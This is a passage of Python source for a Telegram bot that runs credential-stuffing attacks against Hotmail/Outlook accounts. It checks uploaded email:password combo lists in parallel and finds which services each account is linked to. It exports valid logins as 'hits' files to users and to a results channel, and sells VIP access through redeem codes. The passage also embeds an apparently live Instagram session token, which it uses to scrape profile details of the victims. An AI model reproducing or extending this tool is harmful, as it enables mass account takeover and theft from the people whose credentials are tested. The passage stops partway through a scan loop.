                    f"⚡ Speed: {cpm} CPM\n\n"
                    f"🔍 Last: {last_em}",
                    chat_id, progress_msg.message_id,
                    parse_mode='HTML',
                    reply_markup=stop_scan_keyboard(user_id)
                )
            except:
                pass
            time.sleep(2)

    progress_thread = threading.Thread(target=progress_updater, daemon=True)
    progress_thread.start()

    # Run all accounts in parallel (20 at a time)
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        executor.map(process_account, enumerate(lines))

    stopped[0] = True

    if not active_scans.get(user_id, False):
        bot.send_message(chat_id, "⏹ <b>Scan Stopped by User</b>", parse_mode='HTML')

    # Sync back to original variables for final summary
    hits = state['hits']
    bad = state['bad']
    retry_count = state['retry']
    linked_total = state['linked']
    all_hits = state['all_hits']

    # Unpin
    try:
        bot.unpin_chat_message(chat_id, progress_msg.message_id)
    except:
        pass

    # Create hits file(s) - separate file for each service
    if all_hits:
        # Group hits by service
        hits_by_service = {}
        for hit_data in all_hits:
            for service in hit_data.get('services', []):
                if service not in hits_by_service:
                    hits_by_service[service] = []
                hits_by_service[service].append(hit_data)

        # Create file for each service
        for service_name, service_hits in hits_by_service.items():
            # Clean service name for filename
            safe_service_name = service_name.replace(" ", "_").replace("+", "Plus")
            hits_file_path = f"hits_{safe_service_name}_by_{MY_SIGNATURE.replace('@', '')}.txt"

            with open(hits_file_path, 'w', encoding='utf-8') as f:
                f.write(f"# Created by {MY_SIGNATURE} {CHANNEL}\n")
                f.write(f"# Scan Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"# Service: {service_name}\n")
                f.write(f"# Total Hits: {len(service_hits)}\n\n")

                for idx, hit_data in enumerate(service_hits, 1):
                    f.write(f"------hit found #{idx}----\n")
                    f.write(f"Email: {hit_data['email']}\n")
                    f.write(f"Password: {hit_data['password']}\n")
                    f.write(f"Service: {service_name}\n")
                    f.write(f"\n")

            try:
                send_to = user_id if is_group_scan else chat_id
                with open(hits_file_path, 'rb') as f:
                    bot.send_document(send_to, f,
                                    caption=f"📁 {service_name} Hits\n\n"
                                           f"Total: {len(service_hits)} hits\n"
                                           f"💎 {MY_SIGNATURE}")
            except:
                pass

            # Clean up
            if os.path.exists(hits_file_path):
                os.remove(hits_file_path)

        # If no services found but still has hits (empty services)
        hits_without_services = [h for h in all_hits if not h.get('services')]
        if hits_without_services:
            hits_file_path = f"hits_NoService_by_{MY_SIGNATURE.replace('@', '')}.txt"
            with open(hits_file_path, 'w', encoding='utf-8') as f:
                f.write(f"# Created by {MY_SIGNATURE} {CHANNEL}\n")
                f.write(f"# Scan Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"# Hits without linked services\n")
                f.write(f"# Total: {len(hits_without_services)}\n\n")

                for idx, hit_data in enumerate(hits_without_services, 1):
                    f.write(f"------hit found #{idx}----\n")
                    f.write(f"Email: {hit_data['email']}\n")
                    f.write(f"Password: {hit_data['password']}\n")
                    f.write(f"\n")

            try:
                send_to = user_id if is_group_scan else chat_id
                with open(hits_file_path, 'rb') as f:
                    bot.send_document(send_to, f,
                                    caption=f"📁 Hits (No Services)\n\n"
                                           f"Total: {len(hits_without_services)} hits\n"
                                           f"💎 {MY_SIGNATURE}")
            except:
                pass

            if os.path.exists(hits_file_path):
                os.remove(hits_file_path)

    # Final summary with sorted export button
    sorted_markup = None
    if hits > 0 and all_hits:
        sorted_markup = types.InlineKeyboardMarkup()
        sorted_markup.add(types.InlineKeyboardButton("📂 Export Sorted by Service", callback_data=f"sorted_export_{user_id}"))
        user_sessions[user_id] = user_sessions.get(user_id, {})
        user_sessions[user_id]["last_hits_data"] = all_hits

    if is_group_scan:
        bot.send_message(chat_id,
                        f"✅ <b>SCAN COMPLETED!</b>\n\n"
                        f"📊 Results:\n"
                        f"• Hits: {hits}\n"
                        f"• Bad: {bad}\n"
                        f"• Retry: {retry_count}\n"
                        f"• Linked: {linked_total}\n"
                        f"• Total: {total}\n\n"
                        f"📩 <i>Hits wurden dir privat gesendet!</i>\n\n"
                        f"💎 {MY_SIGNATURE}",
                        parse_mode='HTML')
        if hits > 0:
            bot.send_message(user_id,
                            f"✅ <b>SCAN COMPLETED!</b>\n\n"
                            f"📊 Results:\n"
                            f"• Hits: {hits}\n"
                            f"• Bad: {bad}\n"
                            f"• Retry: {retry_count}\n"
                            f"• Linked: {linked_total}\n"
                            f"• Total: {total}\n\n"
                            f"⬆️ Deine Hits findest du oben!\n\n"
                            f"💎 {MY_SIGNATURE}",
                            parse_mode='HTML',
                            reply_markup=sorted_markup)
    else:
        bot.send_message(chat_id,
                        f"✅ <b>SCAN COMPLETED!</b>\n\n"
                        f"📊 Results:\n"
                        f"• Hits: {hits}\n"
                        f"• Bad: {bad}\n"
                        f"• Retry: {retry_count}\n"
                        f"• Linked: {linked_total}\n"
                        f"• Total: {total}\n\n"
                        f"💎 {MY_SIGNATURE}",
                        parse_mode='HTML',
                        reply_markup=sorted_markup)

    record_scan(user_id, username=username or "", scan_type=scan_mode,
               combos_count=total, hits=hits, bads=bad)
    update_stats(user_id, hits, bad, total, scan_mode)

    # Clean up
    if os.path.exists(file_path):
        os.remove(file_path)

    if user_id in user_sessions:
        if user_sessions[user_id].get("last_hits_data"):
            kept = {"last_hits_data": user_sessions[user_id]["last_hits_data"]}
            user_sessions[user_id] = kept
        else:
            del user_sessions[user_id]

    stop_scan(user_id)

# Run Bot
if __name__ == "__main__":
    print("="*50)
    print("🤖 Skyline HOTMAIL Checker Bot - ULTIMATE")
    print(f"👤 Admin ID: {ADMIN_ID}")
    print(f"💎 Created by: {MY_SIGNATURE}")
    print("✅ All Features: ENABLED")
    print("="*50)

# ═══════════════════════════════════════════════════════════════════════════
# NEW FEATURES - ADDED BY @AraboMardelli
# ═══════════════════════════════════════════════════════════════════════════

# Channel for results (No local file storage)
RESULTS_CHANNEL = "-1002465589285"

# JSON Database file
USERS_DB_JSON = "users_database.json"

# Redeem codes storage
REDEEM_CODES_FILE = "redeem_codes.json"

# JSON Database Functions
def load_json_users():
    """Load users from JSON"""
    if os.path.exists(USERS_DB_JSON):
        try:
            with open(USERS_DB_JSON, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            return {"users": []}
    return {"users": []}

def save_json_users(data):
    """Save users to JSON"""
    with open(USERS_DB_JSON, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def get_json_user(user_id):
    """Get user from JSON"""
    data = load_json_users()
    for user in data['users']:
        if user['id'] == user_id:
            return user
    return None

def add_json_user(user_id, username, first_name):
    """Add user to JSON"""
    data = load_json_users()

    if get_json_user(user_id):
        return

    new_user = {
        "id": user_id,
        "name": first_name or "User",
        "username": username or "unknown",
        "link_account": f"tg://user?id={user_id}",
        "account_number": str(user_id),
        "membership": "Free",
        "points": 0,
        "total_scans": 0,
        "total_hits": 0,
        "is_vip": False,
        "vip_until": None,
        "is_banned": False,
        "last_claim": None,
        "join_date": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }

    data['users'].append(new_user)
    save_json_users(data)

def update_json_user(user_id, **kwargs):
    """Update JSON user"""
    data = load_json_users()
    for user in data['users']:
        if user['id'] == user_id:
            for key, value in kwargs.items():
                user[key] = value
            save_json_users(data)
            return True
    return False

def get_json_stats():
    """Get statistics from JSON"""
    data = load_json_users()
    users = data.get('users', [])

    total = len(users)
    vips = sum(1 for u in users if u.get('is_vip'))
    banned = sum(1 for u in users if u.get('is_banned'))

    vip_1h = vip_1d = vip_1w = vip_1m = vip_forever = 0

    for u in users:
        if u.get('is_vip'):
            vip_until = u.get('vip_until')
            if vip_until == "Forever":
                vip_forever += 1
            elif vip_until:
                try:
                    vip_date = datetime.datetime.strptime(vip_until, "%Y-%m-%d %H:%M:%S")
                    now = datetime.datetime.now()
                    remaining = (vip_date - now).days

                    if remaining >= 25:
                        vip_1m += 1
                    elif remaining >= 6:
                        vip_1w += 1
                    elif remaining >= 1:
                        vip_1d += 1
                    else:
                        vip_1h += 1
                except:
                    pass

    return {
        "total": total,
        "vips": vips,
        "banned": banned,
        "vip_1h": vip_1h,
        "vip_1d": vip_1d,
        "vip_1w": vip_1w,
        "vip_1m": vip_1m,
        "vip_forever": vip_forever
    }

# Send to Channel
def send_to_channel(text, file_content=None, filename=None):
    """Send results to channel"""
    try:
        if file_content:
            file_obj = BytesIO(file_content.encode('utf-8'))
            file_obj.name = filename or "results.txt"
            bot.send_document(RESULTS_CHANNEL, file_obj, caption=text[:1000])
        else:
            bot.send_message(RESULTS_CHANNEL, text[:4000])
        return True
    except:
        return False

# Redeem Key System
def load_redeem_codes():
    """Load redeem codes"""
    if os.path.exists(REDEEM_CODES_FILE):
        try:
            with open(REDEEM_CODES_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_redeem_codes(codes):
    """Save redeem codes"""
    with open(REDEEM_CODES_FILE, 'w') as f:
        json.dump(codes, f, indent=2)

def generate_redeem_code(vip_duration="1d", points=0):
    """Generate redeem code"""
    code = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=12))
    codes = load_redeem_codes()
    codes[code] = {
        "vip_duration": vip_duration,
        "points": points,
        "used": False,
        "used_by": None,
        "created_at": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    save_redeem_codes(codes)
    return code

def use_redeem_code(code, user_id):
    """Use redeem code"""
    codes = load_redeem_codes()

    if code not in codes:
        return False, "Invalid code!"

    if codes[code]['used']:
        return False, "Code already used!"

    # Mark as used
    codes[code]['used'] = True
    codes[code]['used_by'] = user_id
    codes[code]['used_at'] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    save_redeem_codes(codes)

    # Apply benefits
    vip_duration = codes[code]['vip_duration']
    points = codes[code]['points']

    user = get_json_user(user_id)
    if not user:
        return False, "User not found!"

    # Add VIP
    if vip_duration:
        add_vip(user_id, user['username'], vip_duration)

    # Add points
    if points > 0:
        current_points = user.get('points', 0)
        update_json_user(user_id, points=current_points + points)

    # Notify admin
    try:
        username_display = f"@{user['username']}" if user.get('username') and user['username'] != 'unknown' else f"ID: {user_id}"
        bot.send_message(
            ADMIN_ID,
            f"🔑 <b>KEY EINGELÖST!</b>\n\n"
            f"👤 Nutzer: {username_display}\n"
            f"🆔 ID: <code>{user_id}</code>\n"
            f"⏱ VIP Dauer: <b>{vip_duration}</b>\n"
            f"🔑 Key: <code>{code}</code>\n"
            f"📅 Zeit: {datetime.datetime.now().strftime('%d.%m.%Y %H:%M')}",
            parse_mode='HTML'
        )
    except:
        pass

    return True, f"✅ Redeemed!\nVIP: {vip_duration}\nPoints: +{points}"

# Daily Claim
def can_claim_daily(user_id):
    """Check if can claim"""
    user = get_json_user(user_id)
    if not user:
        return False

    last_claim = user.get('last_claim')
    if not last_claim:
        return True

    try:
        last = datetime.datetime.strptime(last_claim, "%Y-%m-%d %H:%M:%S")
        now = datetime.datetime.now()
        diff = (now - last).total_seconds()
        return diff >= 86400  # 24 hours
    except:
        return True

def claim_daily(user_id):
    """Claim daily reward"""
    if not can_claim_daily(user_id):
        return False, "Already claimed today!"

    # Give reward (10 points)
    user = get_json_user(user_id)
    current_points = user.get('points', 0)

    update_json_user(user_id, 
                    points=current_points + 10,
                    last_claim=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))

    return True, "✅ Claimed 10 points!"

# Leaderboard
def get_leaderboard():
    """Get top 10 users"""
    data = load_json_users()
    users = data.get('users', [])

    # Sort by hits
    sorted_users = sorted(users, key=lambda x: x.get('total_hits', 0), reverse=True)

    return sorted_users[:10]


# ═══════════════════════════════════════════════════════════════════════════
# NEW MESSAGE HANDLERS
# ═══════════════════════════════════════════════════════════════════════════


# Admin: Generate Redeem Code
@bot.message_handler(commands=['gencode'])
def generate_code_handler(message):
    """Generate redeem code (Admin only)"""
    if message.from_user.id != ADMIN_ID:
        return

    # Parse: /gencode 1d 50
    try:
        parts = message.text.split()
        vip_duration = parts[1] if len(parts) > 1 else "1d"
        points = int(parts[2]) if len(parts) > 2 else 0

        code = generate_redeem_code(vip_duration, points)

        bot.send_message(message.chat.id, 
            f"✅ Code Generated!\n\n"
            f"🔑 Code: <code>{code}</code>\n"
            f"👑 VIP: {vip_duration}\n"
            f"⭐ Points: {points}",
            parse_mode='HTML')
    except:
        bot.send_message(message.chat.id, 
            "Usage: /gencode [duration] [points]\n\n"
            "Example: /gencode 1d 50")


# ═══════════════════════════════════════════════════════════════════════════
# MAIN WITH STARTUP STATISTICS
# ═══════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    print("="*70)
    print("╔══════════════════════════════════════════════════════════════════╗")
    print("║                                                                  ║")
    print("║      🔒 HOTMAIL CHECKER BOT v2.0 - ENHANCED EDITION             ║")
    print("║                                                                  ║")
    print("╚══════════════════════════════════════════════════════════════════╝")
    print("="*70)
    print()
    print(f"💎 Created by: {MY_SIGNATURE}")
    print(f"📱 Channel: {CHANNEL}")
    print()
    print("="*70)

    # Initialize JSON if not exists
    if not os.path.exists(USERS_DB_JSON):
        save_json_users({"users": []})
        print("✅ JSON Database created")

    # Get statistics
    stats = get_json_stats()

    print("📊 STATISTICS:")
    print("="*70)
    print(f"  Admins: 1")
    print(f"  Members: {stats['total']}")
    print(f"  VIP Members: {stats['vips']}")
    print(f"  Banned Members: {stats['banned']}")
    print()
    print(f"  Membership 1h: {stats['vip_1h']}")
    print(f"  Membership 1d: {stats['vip_1d']}")
    print(f"  Membership 1w: {stats['vip_1w']}")
    print(f"  Membership 1m: {stats['vip_1m']}")
    print(f"  Forever: {stats['vip_forever']}")
    print()
    print(f"  Created by {MY_SIGNATURE}")
    print("="*70)
    print()
    print("✨ NEW FEATURES:")
    print("="*70)
    print("  ✅ JSON Database (No SQLite)")
    print("  ✅ Send to Channel (No local files)")
    print("  ✅ Redeem Key System")
    print("  ✅ Leaderboard")
    print("  ✅ Daily Claim")
    print("  ✅ Check Single Account")
    print("  ✅ 70+ Services")
    print("  ✅ 12+ AI Platforms")
    print("="*70)
    print()
    print("🚀 Bot is running!")
    print("="*70)
    print()

    # Daily Auto Stats Thread
    def daily_stats_sender():
        import time as _time
        while True:
            now = datetime.datetime.now()
            next_midnight = now.replace(hour=0, minute=0, second=0, microsecond=0) + datetime.timedelta(days=1)
            wait_seconds = (next_midnight - now).total_seconds()
            _time.sleep(wait_seconds)

            try:
                conn = get_db()
                c = conn.cursor()
                today_str = datetime.datetime.now().strftime('%Y-%m-%d')
                yesterday_str = (datetime.datetime.now() - datetime.timedelta(days=1)).strftime('%Y-%m-%d')

                c.execute("SELECT COUNT(*) FROM scans WHERE scan_date LIKE ?", (f"{yesterday_str}%",))
                daily_scans = c.fetchone()[0]

                c.execute("SELECT COALESCE(SUM(hits_count),0), COALESCE(SUM(bad_count),0), COALESCE(SUM(total_checked),0) FROM scans WHERE scan_date LIKE ?", (f"{yesterday_str}%",))
                row = c.fetchone()
                daily_hits, daily_bad, daily_total = row[0], row[1], row[2]

                c.execute("SELECT COUNT(*) FROM users")
                total_users = c.fetchone()[0]
                c.execute("SELECT COUNT(*) FROM users WHERE is_vip = 1")
                total_vips = c.fetchone()[0]
                c.execute("SELECT COUNT(*) FROM users WHERE is_banned = 1")
                total_banned = c.fetchone()[0]

                c.execute("SELECT COUNT(*) FROM users WHERE join_date LIKE ?", (f"{yesterday_str}%",))
                new_users = c.fetchone()[0]
                conn.close()

                hit_rate = round((daily_hits / daily_total * 100), 1) if daily_total > 0 else 0

                stats_msg = (
                    f"📊 <b>DAILY STATS — {yesterday_str}</b>\n\n"
                    f"👥 <b>Users:</b>\n"
                    f"   Total: {total_users} | VIP: {total_vips} | Banned: {total_banned}\n"
                    f"   New today: {new_users}\n\n"
                    f"🔎 <b>Scans:</b>\n"
                    f"   Total scans: {daily_scans}\n"
                    f"   Combos checked: {daily_total}\n"
                    f"   ✅ Hits: {daily_hits} | ❌ Bad: {daily_bad}\n"
                    f"   📈 Hit Rate: {hit_rate}%\n\n"
                    f"💎 {MY_SIGNATURE}"
                )

                bot.send_message(ADMIN_ID, stats_msg, parse_mode='HTML')
                print(f"[DailyStats] Sent daily stats for {yesterday_str}")
            except Exception as e:
                print(f"[DailyStats] Error: {e}")

    stats_thread = threading.Thread(target=daily_stats_sender, daemon=True)
    stats_thread.start()
    print("📊 Daily auto-stats thread started")

    from web_app import start_web_server
    web_thread = threading.Thread(target=start_web_server, args=(5000,), daemon=True)
    web_thread.start()
    print("🌐 Web server started on port 5000")

    is_deployed = os.environ.get("REPLIT_DEPLOYMENT") == "1"

    if is_deployed:
        print("🌐 PRODUCTION MODE — Only web server, no polling.")
        print("💡 Bot polling runs from dev environment only.")
        import time as _time
        while True:
            _time.sleep(3600)
    else:
        print("🤖 DEV MODE — Starting bot polling...")
        import time as _time
        while True:
            try:
                bot.remove_webhook()
                _time.sleep(1)
                bot.infinity_polling(
                    timeout=60,
                    long_polling_timeout=60,
                    allowed_updates=["message", "callback_query", "chat_member"],
                    logger_level=None,
                    restart_on_change=False
                )
            except KeyboardInterrupt:
                print("\n\n✋ Bot stopped")
                break
            except Exception as e:
                print(f"\n❌ Polling error: {e} — restarting in 5s...")
                _time.sleep(5)


# ═══════════════════════════════════════════════════════════════════════════
# ADDITIONS - By @pyabrodie for Mahdi
# All original code above is preserved 100%
# ═══════════════════════════════════════════════════════════════════════════

# Additional imports
try:
    import pycountry
except:
    print("⚠️  Warning: pycountry not installed. Run: pip install pycountry")
    pycountry = None

# Bot Username
BOT_USERNAME = "@Full_InboxRobot"
RESULTS_CHANNEL = "-1002465589285"

# Instagram Token
INSTAGRAM_TOKEN = "Bearer IGT:2:eyJkc191c2VyX2lkIjoiNzk1MzQ0MjI4MDAiLCJzZXNzaW9uaWQiOiI3OTUzNDQyMjgwMCUzQWdEWWEzMXdFa1pjbDFQJTNBMjUlM0FBWWdEWC1lVTJNMlAzYV8yX3E2RUZLS1VwOExUbVllZjNubVV4ODhYaEEifQ=="

# ═══════════════════════════════════════════════════════════════════════════
# INSTAGRAM FULL CAPTURE API
# ═══════════════════════════════════════════════════════════════════════════

def get_instagram_full_info(username):
    """Get Instagram full information using new API"""
    try:
        # Step 1: Get User ID
        r = requests.get(
            "https://i-fallback.instagram.com/api/v1/fbsearch/ig_typeahead/",
            params={"query": username},
            headers={
                "User-Agent": "Instagram 316.0.0.38.109 Android",
                "Authorization": INSTAGRAM_TOKEN
            }
        )

        data = r.json()
        if not data.get("list"):
            return None

        user_id = data["list"][0]["user"]["id"]

        # Step 2: Get Full Info
        response = requests.post(
            f"https://i.instagram.com/api/v1/users/{user_id}/info_stream/",
            data={
                "is_prefetch": "false",
                "entry_point": "profile",
                "from_module": "search_typeahead",
                "_uuid": "6b4df3f6-8663-4439-af43-54b3e3d8dca1"
            },
            headers={
                "User-Agent": "Instagram 316.0.0.38.109 Android",
                "Authorization": INSTAGRAM_TOKEN,
                "X-IG-App-ID": "567067343352427"
            }
        )

        user = json.loads(response.text.strip().split('\n')[1]).get('user', {})

        # Step 3: Get Country and Join Date
        try:
            variables = json.dumps({
                "params": {
                    "app_id": "com.bloks.www.ig.about_this_account",
                    "infra_params": {"device_id": "6b4df3f6-8663-4439-af43-54b3e3d8dca1"},
                    "bloks_versioning_id": "b07c6b5ea93d2cf8d3582bc3688f78b5adb49ace81156e669d9ca3497258bd57",
                    "params": json.dumps({"referer_type": "ProfileMore", "target_user_id": user_id})
                },
                "is_pando": True
            })

            r2 = requests.post(
                "https://i.instagram.com/graphql_www",
                data={
                    'method': "post", 'pretty': "false", 'format': "json",
                    'server_timestamps': "true", 'locale': "user", 'purpose': "fetch",
                    'fb_api_req_friendly_name': "IGBloksAppRootQuery",
                    'client_doc_id': "2533602983584098948018695922",
                    'variables': variables
                },
                headers={
                    "User-Agent": "Instagram 316.0.0.38.109 Android",
                    "authorization": INSTAGRAM_TOKEN
                }
            )

            bundle_str = r2.json()['data']['1$bloks_app(params:$params)']['screen_content']['component']['bundle']['bloks_bundle_tree']

            # Extract join date
            match = re.search(r'([A-Za-z]+\s+\d{4})', bundle_str)
            join_date = match.group(1) if match else "N/A"

            # Extract country
            bundle_json = json.loads(bundle_str)
            country = "N/A"
            data_array = bundle_json.get('layout', {}).get('bloks_payload', {}).get('data', [])
            for item in data_array:
                if item.get('data', {}).get('key') == 'IG_ABOUT_THIS_ACCOUNT:about_this_account_country':
                    country = item.get('data', {}).get('initial', 'N/A')
                    break
        except:
            join_date = "N/A"
            country = "N/A"

        return {
            'user_id': user.get('pk', 'N/A'),
            'username': user.get('username', 'N/A'),
            'full_name': user.get('full_name', 'N/A'),
            'bio': user.get('biography', 'N/A'),
            'followers': user.get('follower_count', 0),
            'following': user.get('following_count', 0),
            'posts': user.get('media_count', 0),
            'is_private': user.get('is_private', False),
            'is_verified': user.get('is_verified', False),
            'is_business': user.get('is_business', False),
            'join_date': join_date,
            'country': country,
            'profile_pic': user.get('profile_pic_url', 'N/A')
        }
    except Exception as e:
        return None

# ═══════════════════════════════════════════════════════════════════════════
# COUNTRY DETECTION
# ═══════════════════════════════════════════════════════════════════════════

def get_country_flag(country_name):
    """Get country flag emoji"""
    if not pycountry or not country_name or country_name == 'N/A':
        return '🏳️'
    try:
        country = pycountry.countries.lookup(country_name)
        return ''.join(chr(127397 + ord(c)) for c in country.alpha_2)
    except:
        return '🏳️'

# ═══════════════════════════════════════════════════════════════════════════
# NEW FILE FORMAT
# ═══════════════════════════════════════════════════════════════════════════

def create_new_format_file(service_name, hits):
    """Create file in new format: email:password"""
    header = f"""╔════════════════════════════════════════════════╗
║ {service_name} Hits - @pyabrodie                 
║ Bot: @Full_InboxRobot                          
║ Channel: t.me/machitools                       
╚════════════════════════════════════════════════╝

"""
    content = header
    for hit in hits:
        content += hit + "\n"
    return content

def send_to_channel_func(text, file_content=None, filename=None):
    """Send to channel"""
    try:
        if file_content:
            file_obj = BytesIO(file_content.encode('utf-8'))
            file_obj.name = filename or "results.txt"
            bot.send_document(RESULTS_CHANNEL, file_obj, caption=text[:1000])
        else:
            bot.send_message(RESULTS_CHANNEL, text[:4000])
        return True
    except Exception as e:
        print(f"Channel error: {e}")
        return False

# ═══════════════════════════════════════════════════════════════════════════
# CHECK ONE ACCOUNT (Enhanced)
# ═══════════════════════════════════════════════════════════════════════════

def check_one_account_full(email, password, user_id):
    """Enhanced single account check"""

    bot.send_message(user_id, f"🔍 Checking: <code>{email}</code>", parse_mode='HTML')

    result = HotmailChecker.check_account(email, password)
    if result.get("status") == "RETRY":
        result = HotmailChecker.check_account(email, password)

    if result["status"] != "HIT":
        bot.send_message(user_id, f"❌ <b>INVALID</b>\n\n📧 <code>{email}</code>", parse_mode='HTML')
        return

    token = result.get("token")
    cid = result.get("cid")

    bot.send_message(user_id, f"✅ <b>VALID!</b>\n\n🔍 Checking services...", parse_mode='HTML')

    services = HotmailChecker.check_services(email, password, token, cid, SERVICES_ALL)

    if not services:
        bot.send_message(user_id, f"📧 <code>{email}:{password}</code>\n\n❌ No services", parse_mode='HTML')
        return

    # Instagram Full
    if "Instagram" in services:
        bot.send_message(user_id, "📸 Instagram detected! Getting details...")

        ig_username = email.split('@')[0]
        ig_info = get_instagram_full_info(ig_username)

        if ig_info:
            flag = get_country_flag(ig_info['country'])

            ig_text = f"""📸 <b>INSTAGRAM FULL</b>

📧 {email}:{password}

👤 {ig_info['full_name']}
🆔 @{ig_info['username']}
📝 {ig_info['bio'][:100]}

📊 Stats:
• Followers: {ig_info['followers']:,}
• Following: {ig_info['following']:,}
• Posts: {ig_info['posts']}

📅 Join: {ig_info['join_date']}
{flag} {ig_info['country']}

🔒 Private: {'Yes' if ig_info['is_private'] else 'No'}
✓ Verified: {'Yes' if ig_info['is_verified'] else 'No'}

💎 {MY_SIGNATURE} | 🤖 {BOT_USERNAME}"""

            bot.send_message(user_id, ig_text, parse_mode='HTML')

            if ig_info['profile_pic'] != 'N/A':
                try:
                    bot.send_photo(user_id, ig_info['profile_pic'])
                except:
                    pass

    # TikTok Full
    if "TikTok" in services:
        bot.send_message(user_id, "🎵 TikTok detected! Getting details...")

        tk_result = HotmailChecker.check_tiktok_full(email, password, token, cid)

        if tk_result and tk_result.get('has_tiktok'):
            tk_text = f"""🎵 <b>TIKTOK FULL</b>

📧 {email}:{password}

👤 @{tk_result.get('username', 'Unknown')}
👥 {format_number(tk_result.get('followers', 0))} followers
🎬 {tk_result.get('videos', 0)} videos
❤️ {format_number(tk_result.get('likes', 0))} likes

✓ Verified: {'Yes' if tk_result.get('verified') else 'No'}

💎 {MY_SIGNATURE} | 🤖 {BOT_USERNAME}"""

            bot.send_message(user_id, tk_text, parse_mode='HTML')

    # Summary
    summary = f"""✅ <b>CHECK COMPLETE</b>

📧 <code>{email}:{password}</code>

📊 Services ({len(services)}):
{chr(10).join(f'• {s}' for s in services)}

💎 {MY_SIGNATURE} | 🤖 {BOT_USERNAME}"""

    bot.send_message(user_id, summary, parse_mode='HTML')


# ═══════════════════════════════════════════════════════════════════════════
# NEW SCAN OPTIONS: Check One Account + Instagram Full Capture
# ═══════════════════════════════════════════════════════════════════════════

# Override scan_mode_keyboard to add new options
# Removed duplicate - using main scan_mode_keyboard instead
# def scan_mode_keyboard_enhanced(user_id):
    """Enhanced keyboard with Check One Account and Instagram Full"""
    markup = types.InlineKeyboardMarkup(row_width=1)

    btn1 = types.InlineKeyboardButton("1️⃣ All Services", callback_data="scan_all")
    btn2 = types.InlineKeyboardButton("2️⃣ Select Single Platform", callback_data="scan_single_platform")
    btn3 = types.InlineKeyboardButton("3️⃣ Gaming Platforms", callback_data="scan_gaming")
    btn4 = types.InlineKeyboardButton("4️⃣ Social Media", callback_data="scan_social")
    btn5 = types.InlineKeyboardButton("5️⃣ Streaming Services", callback_data="scan_streaming")
    btn6 = types.InlineKeyboardButton("6️⃣ PSN Detailed", callback_data="scan_psn")
    btn7 = types.InlineKeyboardButton("7️⃣ Custom Domain", callback_data="scan_custom")
    btn8 = types.InlineKeyboardButton("8️⃣ AI Platforms (Free)", callback_data="scan_ai")
    btn9 = types.InlineKeyboardButton("9️⃣ TikTok Full Capture (VIP Forever)", callback_data="scan_tiktok")
    btn10 = types.InlineKeyboardButton("🔟 Check One Account", callback_data="scan_check_one")

    # Instagram Full Capture - VIP only
    if is_vip(user_id):
        btn11 = types.InlineKeyboardButton("1️⃣1️⃣ Instagram Full Capture (VIP)", callback_data="scan_instagram_full")
        markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8, btn9, btn10, btn11)
    else:
        btn11 = types.InlineKeyboardButton("🔒 Instagram Full (VIP Only)", callback_data="vip_required")
        markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8, btn9, btn10, btn11)

    btn_back = types.InlineKeyboardButton("◀️ Back", callback_data="back_main")
    markup.add(btn_back)

    return markup

# Handler for Check One Account
@bot.callback_query_handler(func=lambda call: call.data == 'scan_check_one')
def handle_check_one(call):
    user_id = call.from_user.id

    if is_banned(user_id):
        bot.answer_callback_query(call.id, "❌ Banned!", show_alert=True)
        return

    bot.answer_callback_query(call.id)

    bot.send_message(user_id, """🔟 <b>CHECK ONE ACCOUNT</b>

Send: <code>email@outlook.com:password</code>

Example:
<code>example@outlook.com:Password123</code>

━━━━━━━━━━━━━━━━━━━━━━━━━━
💎 @pyabrodie | 🤖 @Full_InboxRobot""", parse_mode='HTML')

    user_sessions[user_id] = {"mode": "check_one_account"}

@bot.message_handler(func=lambda m: user_sessions.get(m.from_user.id, {}).get('mode') == 'check_one_account')
def process_check_one(message):
    user_id = message.from_user.id

    try:
        if ':' not in message.text:
            bot.send_message(user_id, "❌ Invalid format! Use: email:password")
            return

        email, password = message.text.strip().split(':', 1)
        check_one_account_full(email, password, user_id)

    except Exception as e:
        bot.send_message(user_id, f"❌ Error: {str(e)}")

    if user_id in user_sessions:
        del user_sessions[user_id]

# Handler for Instagram Full Capture
@bot.callback_query_handler(func=lambda call: call.data == 'scan_instagram_full')
def handle_instagram_full(call):
    user_id = call.from_user.id

    if is_banned(user_id):
        bot.answer_callback_query(call.id, "❌ Banned!", show_alert=True)
        return

    if not is_vip(user_id):
        bot.answer_callback_query(call.id, "❌ VIP Only!", show_alert=True)
        return

    bot.answer_callback_query(call.id)

    can_scan_result, wait_time = can_scan(user_id)
    if not can_scan_result:
        bot.send_message(user_id, f"⏰ Wait {wait_time}")
        return

    bot.send_message(user_id, """1️⃣1️⃣ <b>INSTAGRAM FULL CAPTURE</b>

📤 Send combo file (.txt)

Format: email:password

━━━━━━━━━━━━━━━━━━━━━━━━━━
💎 @pyabrodie | 🤖 @Full_InboxRobot""", parse_mode='HTML')

    user_sessions[user_id] = {"mode": "instagram_full_capture"}

def process_instagram_scan(user_id, combos):
    """Process Instagram Full Capture scan"""

    bot.send_message(user_id, f"📸 Starting Instagram scan...\n📊 Combos: {len(combos)}")

    hits = []
    checked = 0
    ig_hits = 0

    for combo in combos[:50]:  # Limit for safety
        if user_id in active_scans and not active_scans[user_id]:
            bot.send_message(user_id, "⏹️ Stopped")
            break

        try:
            email, password = combo.split(':', 1)

            result = HotmailChecker.check_account(email, password)
            if result.get("status") == "RETRY":
                result = HotmailChecker.check_account(email, password)

            if result["status"] == "HIT":
                token = result.get("token")
                cid = result.get("cid")

                ig_check = HotmailChecker.check_services(email, password, token, cid, {"Instagram": "security@mail.instagram.com"})

                if ig_check and "Instagram" in ig_check:
                    ig_username = email.split('@')[0]
                    ig_info = get_instagram_full_info(ig_username)

                    if ig_info:
                        ig_hits += 1
                        flag = get_country_flag(ig_info['country'])

                        hit_line = f"{email}:{password} | {flag} {ig_info['country']} | {ig_info['followers']:,} followers"
                        hits.append(hit_line)

